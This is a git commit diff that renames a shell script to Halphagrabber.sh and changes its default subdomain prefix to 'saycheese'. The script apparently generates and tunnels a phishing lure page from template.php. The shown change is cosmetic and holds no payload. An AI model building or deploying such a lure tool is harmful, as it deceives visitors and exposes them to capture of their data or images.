e235d37d87006de99f4feafef0fc8154bed81559
Alpha <107472042+ITZMEALPHA@users.noreply.github.com>
2022-06-15 17:32:05 +0530

    Update and rename alphagrabber.sh to Halphagrabber.sh

--- Halphagrabber.sh
+++ Halphagrabber.sh
@@ -223,7 +223,7 @@ sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 start() {
 
 default_choose_sub="Y"
-default_subdomain="alphagrabber$RANDOM"
+default_subdomain="saycheese$RANDOM"
 
 printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
 read choose_sub
